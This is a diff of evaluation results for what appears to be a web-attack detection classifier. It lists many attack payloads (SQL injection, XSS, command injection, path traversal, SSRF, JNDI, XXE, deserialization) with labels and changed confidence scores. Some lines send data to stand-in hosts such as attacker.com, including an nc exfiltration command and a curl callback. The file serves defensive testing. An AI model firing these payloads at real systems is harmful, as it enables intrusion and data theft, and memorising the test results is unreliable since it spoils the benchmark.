@@ -4,7 +4,7 @@
     "payload": "id=1' OR '1'='1",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9573,
+    "confidence": 0.9994,
     "correct": true
   },
   {
@@ -12,7 +12,7 @@
     "payload": "id=1 UNION SELECT null, user(), database()--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9854,
+    "confidence": 0.996,
     "correct": true
   },
   {
@@ -20,7 +20,7 @@
     "payload": "id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9959,
+    "confidence": 0.9976,
     "correct": true
   },
   {
@@ -28,7 +28,7 @@
     "payload": "id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9995,
+    "confidence": 0.9961,
     "correct": true
   },
   {
@@ -36,7 +36,7 @@
     "payload": "id=1'; WAITFOR DELAY '0:0:5'--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9439,
+    "confidence": 0.9824,
     "correct": true
   },
   {
@@ -44,7 +44,7 @@
     "payload": "id=1; SELECT pg_sleep(5)--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9284,
+    "confidence": 0.9909,
     "correct": true
   },
   {
@@ -52,7 +52,7 @@
     "payload": "id=0x27204f52202731273d2731",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.7,
+    "confidence": 0.9707,
     "correct": true
   },
   {
@@ -60,7 +60,7 @@
     "payload": "id=1'/**/OR/**/'1'='1",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9037,
+    "confidence": 0.9771,
     "correct": true
   },
   {
@@ -68,7 +68,7 @@
     "payload": "id=1; DROP TABLE users--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9054,
+    "confidence": 0.9708,
     "correct": true
   },
   {
@@ -76,7 +76,7 @@
     "payload": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9788,
+    "confidence": 0.9912,
     "correct": true
   },
   {
@@ -84,7 +84,7 @@
     "payload": "{\"$where\": \"this.user == 'admin'\"}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9567,
+    "confidence": 0.9778,
     "correct": true
   },
   {
@@ -92,7 +92,7 @@
     "payload": "<script>alert('XSS')</script>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9317,
+    "confidence": 0.9989,
     "correct": true
   },
   {
@@ -100,7 +100,7 @@
     "payload": "<img src=x onerror=alert(1)>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9703,
+    "confidence": 0.9949,
     "correct": true
   },
   {
@@ -108,7 +108,7 @@
     "payload": "<svg/onload=alert(1)>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9758,
+    "confidence": 0.9912,
     "correct": true
   },
   {
@@ -116,7 +116,7 @@
     "payload": "javascript:alert(1)",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9825,
+    "confidence": 0.9946,
     "correct": true
   },
   {
@@ -124,7 +124,7 @@
     "payload": "<body onload=alert(1)>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9707,
+    "confidence": 0.9829,
     "correct": true
   },
   {
@@ -132,7 +132,7 @@
     "payload": "%253cscript%253ealert(1)%253c/script%253e",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9944,
+    "confidence": 0.999,
     "correct": true
   },
   {
@@ -140,7 +140,7 @@
     "payload": "<iframe srcdoc=\"<script>alert(1)</script>\">",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9993,
+    "confidence": 0.9983,
     "correct": true
   },
   {
@@ -148,7 +148,7 @@
     "payload": "<video><source onerror=\"alert(1)\">",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.974,
+    "confidence": 0.9848,
     "correct": true
   },
   {
@@ -156,7 +156,7 @@
     "payload": "java\\tscript:alert(1)",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9742,
+    "confidence": 0.988,
     "correct": true
   },
   {
@@ -164,7 +164,7 @@
     "payload": "; cat /etc/passwd",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9769,
+    "confidence": 0.9977,
     "correct": true
   },
   {
@@ -172,7 +172,7 @@
     "payload": "| id",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.5105,
+    "confidence": 0.9837,
     "correct": true
   },
   {
@@ -180,7 +180,7 @@
     "payload": "$(whoami)",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.5118,
+    "confidence": 0.9769,
     "correct": true
   },
   {
@@ -188,7 +188,7 @@
     "payload": "`uname -a`",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.6911,
+    "confidence": 0.9737,
     "correct": true
   },
   {
@@ -196,23 +196,23 @@
     "payload": "|| ls -la",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.5045,
+    "confidence": 0.9844,
     "correct": true
   },
   {
     "category": "Command Injection (New line)",
     "payload": "%0als",
     "expected": "ATTACK",
-    "predicted": "NORMAL",
-    "confidence": 0.6353,
-    "correct": false
+    "predicted": "ATTACK",
+    "confidence": 0.988,
+    "correct": true
   },
   {
     "category": "Path Traversal (Basic)",
     "payload": "../../../../etc/passwd",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.996,
+    "confidence": 0.9997,
     "correct": true
   },
   {
@@ -220,7 +220,7 @@
     "payload": "../../../../etc/passwd%00",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.996,
+    "confidence": 0.9998,
     "correct": true
   },
   {
@@ -228,7 +228,7 @@
     "payload": "..%2f..%2f..%2fetc%2fshadow",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.851,
+    "confidence": 0.9965,
     "correct": true
   },
   {
@@ -236,7 +236,7 @@
     "payload": "..%252f..%252f..%252fetc%252fhosts",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8945,
+    "confidence": 0.9961,
     "correct": true
   },
   {
@@ -244,7 +244,7 @@
     "payload": "php://filter/convert.base64-encode/resource=index.php",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9568,
+    "confidence": 0.9722,
     "correct": true
   },
   {
@@ -252,7 +252,7 @@
     "payload": "php://input",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.7487,
+    "confidence": 0.9776,
     "correct": true
   },
   {
@@ -260,7 +260,7 @@
     "payload": "http://attacker.com/shell.txt",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9993,
+    "confidence": 0.9906,
     "correct": true
   },
   {
@@ -268,7 +268,7 @@
     "payload": "http://169.254.169.254/latest/meta-data/",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9635,
+    "confidence": 0.977,
     "correct": true
   },
   {
@@ -276,7 +276,7 @@
     "payload": "http://127.0.0.1:22",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.834,
+    "confidence": 0.9785,
     "correct": true
   },
   {
@@ -284,7 +284,7 @@
     "payload": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9992,
+    "confidence": 0.9978,
     "correct": true
   },
   {
@@ -292,7 +292,7 @@
     "payload": "{{7*7}} or {{config.items()}}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9092,
+    "confidence": 0.9854,
     "correct": true
   },
   {
@@ -300,7 +300,7 @@
     "payload": "${os.system('id')}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8579,
+    "confidence": 0.9802,
     "correct": true
   },
   {
@@ -308,7 +308,7 @@
     "payload": "${jndi:ldap://attacker.com/a}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9819,
+    "confidence": 0.9857,
     "correct": true
   },
   {
@@ -316,7 +316,7 @@
     "payload": "() { :;}; echo \"NS:\" $(/usr/bin/id)",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.827,
+    "confidence": 0.9749,
     "correct": true
   },
   {
@@ -324,7 +324,7 @@
     "payload": "admin*)(| (password=*))",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9392,
+    "confidence": 0.9744,
     "correct": true
   },
   {
@@ -332,7 +332,7 @@
     "payload": "' or '1'='1",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8088,
+    "confidence": 0.9937,
     "correct": true
   },
   {
@@ -340,7 +340,7 @@
     "payload": "id=1&id=2",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.7337,
+    "confidence": 0.974,
     "correct": true
   },
   {
@@ -348,7 +348,7 @@
     "payload": "%0d%0aSet-Cookie: session=attacker",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9205,
+    "confidence": 0.9898,
     "correct": true
   },
   {
@@ -356,7 +356,7 @@
     "payload": "Host: evil.com",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8362,
+    "confidence": 0.9755,
     "correct": true
   },
   {
@@ -364,7 +364,7 @@
     "payload": "__proto__[admin]=true",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8055,
+    "confidence": 0.9773,
     "correct": true
   },
   {
@@ -372,7 +372,7 @@
     "payload": "cos\\nsystem\\n(S'id'\\ntR.",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8823,
+    "confidence": 0.9754,
     "correct": true
   },
   {
@@ -380,7 +380,7 @@
     "payload": "query { __schema { types { name } } }",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9293,
+    "confidence": 0.9718,
     "correct": true
   },
   {
@@ -388,7 +388,7 @@
     "payload": "{\"alg\":\"none\"}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8178,
+    "confidence": 0.9698,
     "correct": true
   },
   {
@@ -396,7 +396,7 @@
     "payload": "url=http://malicious.com",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9791,
+    "confidence": 0.9878,
     "correct": true
   },
   {
@@ -404,7 +404,7 @@
     "payload": "id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.999,
+    "confidence": 0.9918,
     "correct": true
   },
   {
@@ -412,7 +412,7 @@
     "payload": "id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\\\a')))",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9996,
+    "confidence": 0.9985,
     "correct": true
   },
   {
@@ -420,7 +420,7 @@
     "payload": "id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9995,
+    "confidence": 0.9985,
     "correct": true
   },
   {
@@ -428,7 +428,7 @@
     "payload": "<svg><script xlink:href=\"http://attacker.com/xss.js\"></script></svg>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9994,
+    "confidence": 0.9977,
     "correct": true
   },
   {
@@ -436,7 +436,7 @@
     "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\\\"/+/onmouseover=1/(f=prompt,f(1))//'>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9895,
+    "confidence": 0.9826,
     "correct": true
   },
   {
@@ -444,7 +444,7 @@
     "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9993,
+    "confidence": 0.9964,
     "correct": true
   },
   {
@@ -452,7 +452,7 @@
     "payload": "{{constructor.constructor('alert(1)')()}}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9806,
+    "confidence": 0.978,
     "correct": true
   },
   {
@@ -460,7 +460,7 @@
     "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9378,
+    "confidence": 0.9702,
     "correct": true
   },
   {
@@ -468,7 +468,7 @@
     "payload": "..\\..\\..\\..\\windows\\system32\\config\\sam",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8851,
+    "confidence": 0.9703,
     "correct": true
   },
   {
@@ -476,7 +476,7 @@
     "payload": "//////////////////etc/passwd",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9713,
+    "confidence": 0.979,
     "correct": true
   },
   {
@@ -484,7 +484,7 @@
     "payload": "; echo $USER | nc attacker.com 1234",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9801,
+    "confidence": 0.986,
     "correct": true
   },
   {
@@ -492,7 +492,7 @@
     "payload": "; /bin/c?t /e*c/p?sswd",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.7502,
+    "confidence": 0.9649,
     "correct": true
   },
   {
@@ -500,7 +500,7 @@
     "payload": "expect://id",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.7567,
+    "confidence": 0.9773,
     "correct": true
   },
   {
@@ -508,7 +508,7 @@
     "payload": "phar://path/to/malicious.phar/shell.php",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.909,
+    "confidence": 0.9735,
     "correct": true
   },
   {
@@ -516,7 +516,7 @@
     "payload": "rmi://attacker.com:1099/Exploit",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.977,
+    "confidence": 0.9863,
     "correct": true
   },
   {
@@ -524,7 +524,7 @@
     "payload": "{\"name\": \"__import__('os').system('id')\"}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9875,
+    "confidence": 0.9867,
     "correct": true
   },
   {
@@ -532,7 +532,7 @@
     "payload": "gopher://localhost:6379/_SET%20foo%20bar",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9477,
+    "confidence": 0.9803,
     "correct": true
   },
   {
@@ -540,7 +540,7 @@
     "payload": "dict://localhost:11211/stat",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9506,
+    "confidence": 0.9741,
     "correct": true
   },
   {
@@ -548,7 +548,7 @@
     "payload": "<!ENTITY % payload SYSTEM \"file:///etc/passwd\"> %payload;",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9992,
+    "confidence": 0.9936,
     "correct": true
   },
   {
@@ -556,7 +556,7 @@
     "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></foo>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9994,
+    "confidence": 0.9914,
     "correct": true
   },
   {
@@ -564,7 +564,7 @@
     "payload": "#set($str=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9477,
+    "confidence": 0.9773,
     "correct": true
   },
   {
@@ -572,7 +572,7 @@
     "payload": "{smart_f_shell_exec('id')}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8661,
+    "confidence": 0.9789,
     "correct": true
   },
   {
@@ -580,7 +580,7 @@
     "payload": "{{7*7}}{{ '7'*7 }}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.7088,
+    "confidence": 0.9762,
     "correct": true
   },
   {
@@ -588,7 +588,7 @@
     "payload": "Transfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9402,
+    "confidence": 0.98,
     "correct": true
   },
   {
@@ -596,7 +596,7 @@
     "payload": "Content-Length: 4\\r\\n\\r\\n1234",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8331,
+    "confidence": 0.9765,
     "correct": true
   },
   {
@@ -604,7 +604,7 @@
     "payload": "/index.php?name=Guest%0d%0aSet-Cookie: session=1",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.962,
+    "confidence": 0.9744,
     "correct": true
   },
   {
@@ -612,7 +612,7 @@
     "payload": "(&(uid=admin)(|(password=*)))",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9703,
+    "confidence": 0.9787,
     "correct": true
   },
   {
@@ -620,7 +620,7 @@
     "payload": "' or string-length(name(.)) > 0 or '1'='1",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9848,
+    "confidence": 0.9925,
     "correct": true
   },
   {
@@ -628,7 +628,7 @@
     "payload": "%0d%0aBcc: victim@example.com",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.7752,
+    "confidence": 0.9747,
     "correct": true
   },
   {
@@ -636,7 +636,7 @@
     "payload": "%0d%0a* CAPABILITY",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.5531,
+    "confidence": 0.971,
     "correct": true
   },
   {
@@ -644,7 +644,7 @@
     "payload": "{\"$where\": \"function() { return this.name == 'admin' }\"}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9906,
+    "confidence": 0.9891,
     "correct": true
   },
   {
@@ -652,7 +652,7 @@
     "payload": "{\"id\": {\"$bitsAllSet\": [1, 5]}}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8924,
+    "confidence": 0.9758,
     "correct": true
   },
   {
@@ -660,7 +660,7 @@
     "payload": "{\"__proto__\": {\"isAdmin\": true}}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9517,
+    "confidence": 0.979,
     "correct": true
   },
   {
@@ -668,7 +668,7 @@
     "payload": "O:8:\"Database\":1:{s:4:\"host\";s:9:\"localhost\";}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8819,
+    "confidence": 0.9762,
     "correct": true
   },
   {
@@ -676,7 +676,7 @@
     "payload": "ac ed 00 05 73 72 00 12 ...",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.5966,
+    "confidence": 0.9752,
     "correct": true
   },
   {
@@ -684,7 +684,7 @@
     "payload": "{\"$type\": \"System.Windows.Data.ObjectDataProvider, ...\"}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9889,
+    "confidence": 0.9788,
     "correct": true
   },
   {
@@ -692,7 +692,7 @@
     "payload": "query { a: user(id:1) { name } b: user(id:2) { name } }",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9521,
+    "confidence": 0.9786,
     "correct": true
   },
   {
@@ -700,7 +700,7 @@
     "payload": "[{\"query\": \"...\"}, {\"query\": \"...\"}]",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8399,
+    "confidence": 0.9711,
     "correct": true
   },
   {
@@ -708,7 +708,7 @@
     "payload": "{\"alg\":\"RS256\",\"kid\":\"../../../../dev/null\",\"typ\":\"JWT\"}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9264,
+    "confidence": 0.9959,
     "correct": true
   },
   {
@@ -716,7 +716,7 @@
     "payload": "{\"alg\":\"RS256\",\"jku\":\"http://attacker.com/key.json\"}",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9994,
+    "confidence": 0.9965,
     "correct": true
   },
   {
@@ -724,7 +724,7 @@
     "payload": "<iframe src=\"https://target.com\" style=\"opacity:0.5\"></iframe>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9819,
+    "confidence": 0.9794,
     "correct": true
   },
   {
@@ -732,7 +732,7 @@
     "payload": "<a href=\"http://malicious.com\" target=\"_blank\">Click here</a>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9875,
+    "confidence": 0.9832,
     "correct": true
   },
   {
@@ -740,7 +740,7 @@
     "payload": "X-Forwarded-Host: attacker.com",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9788,
+    "confidence": 0.9795,
     "correct": true
   },
   {
@@ -748,7 +748,7 @@
     "payload": "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 42\\r\\n",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9936,
+    "confidence": 0.9922,
     "correct": true
   },
   {
@@ -756,7 +756,7 @@
     "payload": "gzip compressed content with chosen prefix",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9166,
+    "confidence": 0.9688,
     "correct": true
   },
   {
@@ -764,7 +764,7 @@
     "payload": "\\x81\\xfe\\x00\\x00... (illegal length)",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.7846,
+    "confidence": 0.9689,
     "correct": true
   },
   {
@@ -772,7 +772,7 @@
     "payload": "<iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe>",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9939,
+    "confidence": 0.9942,
     "correct": true
   },
   {
@@ -780,7 +780,7 @@
     "payload": "User-Agent: ' OR SLEEP(5) OR '",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.8998,
+    "confidence": 0.9677,
     "correct": true
   },
   {
@@ -788,7 +788,7 @@
     "payload": "../../../../tmp/shell.php (inside zip archive)",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9259,
+    "confidence": 0.9954,
     "correct": true
   },
   {
@@ -796,7 +796,7 @@
     "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9798,
+    "confidence": 0.9745,
     "correct": true
   },
   {
@@ -804,7 +804,7 @@
     "payload": "call=getRawDataFromDatabase&query=file:///etc/passwd",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9975,
+    "confidence": 0.9964,
     "correct": true
   },
   {
@@ -812,7 +812,7 @@
     "payload": "id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.999,
+    "confidence": 0.9918,
     "correct": true
   },
   {
@@ -820,7 +820,7 @@
     "payload": "id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9996,
+    "confidence": 0.9988,
     "correct": true
   },
   {
@@ -828,7 +828,7 @@
     "payload": "id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9995,
+    "confidence": 0.9985,
     "correct": true
   },
   {
@@ -836,7 +836,7 @@
     "payload": "id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9993,
+    "confidence": 0.9946,
     "correct": true
   },
   {
@@ -844,7 +844,7 @@
     "payload": "adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d",
     "expected": "ATTACK",
     "predicted": "ATTACK",
-    "confidence": 0.9992,
+    "confidence": 0.9857,
     "correct": true
   },
   {
@@ -852,7 +852,7 @@
     "payload": "GET /",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8635,
+    "confidence": 0.997,
     "correct": true
   },
   {
@@ -860,7 +860,7 @@
     "payload": "GET /static/css/style.css",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7788,
+    "confidence": 0.9608,
     "correct": true
   },
   {
@@ -868,7 +868,7 @@
     "payload": "GET /assets/js/bundle.min.js",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.829,
+    "confidence": 0.97,
     "correct": true
   },
   {
@@ -876,7 +876,7 @@
     "payload": "GET /images/logo.png",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8081,
+    "confidence": 0.9709,
     "correct": true
   },
   {
@@ -884,7 +884,7 @@
     "payload": "GET /favicon.ico",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6659,
+    "confidence": 1.0,
     "correct": true
   },
   {
@@ -892,7 +892,7 @@
     "payload": "GET /robots.txt",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6644,
+    "confidence": 1.0,
     "correct": true
   },
   {
@@ -900,7 +900,7 @@
     "payload": "GET /sitemap.xml",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6724,
+    "confidence": 0.9416,
     "correct": true
   },
   {
@@ -908,7 +908,7 @@
     "payload": "GET /health",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6721,
+    "confidence": 1.0,
     "correct": true
   },
   {
@@ -916,7 +916,7 @@
     "payload": "GET /api/v1/ping",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8044,
+    "confidence": 0.9997,
     "correct": true
   },
   {
@@ -924,7 +924,7 @@
     "payload": "GET /login",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.645,
+    "confidence": 0.9935,
     "correct": true
   },
   {
@@ -932,7 +932,7 @@
     "payload": "GET /search?q=security",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8287,
+    "confidence": 0.9864,
     "correct": true
   },
   {
@@ -940,7 +940,7 @@
     "payload": "GET /search?q=machine+learning",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8467,
+    "confidence": 0.9849,
     "correct": true
   },
   {
@@ -948,7 +948,7 @@
     "payload": "GET /search?q=C%23",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8236,
+    "confidence": 0.9861,
     "correct": true
   },
   {
@@ -956,7 +956,7 @@
     "payload": "GET /search?q=O'Reilly",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8336,
+    "confidence": 0.9766,
     "correct": true
   },
   {
@@ -964,7 +964,7 @@
     "payload": "GET /search?q=1+1=2",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8356,
+    "confidence": 0.9827,
     "correct": true
   },
   {
@@ -972,7 +972,7 @@
     "payload": "GET /api/v1/products",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8454,
+    "confidence": 0.9998,
     "correct": true
   },
   {
@@ -980,7 +980,7 @@
     "payload": "GET /api/v1/products/101",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8462,
+    "confidence": 0.9996,
     "correct": true
   },
   {
@@ -988,7 +988,7 @@
     "payload": "POST /api/v1/login (username/password)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.881,
+    "confidence": 0.9739,
     "correct": true
   },
   {
@@ -996,7 +996,7 @@
     "payload": "POST /api/v1/orders (JSON payload)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8524,
+    "confidence": 0.9848,
     "correct": true
   },
   {
@@ -1004,7 +1004,7 @@
     "payload": "PUT /api/v1/profile (JSON payload)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8557,
+    "confidence": 0.9832,
     "correct": true
   },
   {
@@ -1012,7 +1012,7 @@
     "payload": "PATCH /api/v1/settings/theme",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.9022,
+    "confidence": 0.9951,
     "correct": true
   },
   {
@@ -1020,7 +1020,7 @@
     "payload": "DELETE /api/v1/cart/items/5",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8185,
+    "confidence": 0.9958,
     "correct": true
   },
   {
@@ -1028,7 +1028,7 @@
     "payload": "POST /contact (name, email, message)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8365,
+    "confidence": 0.9525,
     "correct": true
   },
   {
@@ -1036,7 +1036,7 @@
     "payload": "POST /register (detailed user info)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7441,
+    "confidence": 0.9479,
     "correct": true
   },
   {
@@ -1044,7 +1044,7 @@
     "payload": "GET /auth/google/callback",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7464,
+    "confidence": 0.9672,
     "correct": true
   },
   {
@@ -1052,7 +1052,7 @@
     "payload": "POST /collect?v=1&tid=UA-XXXXX",
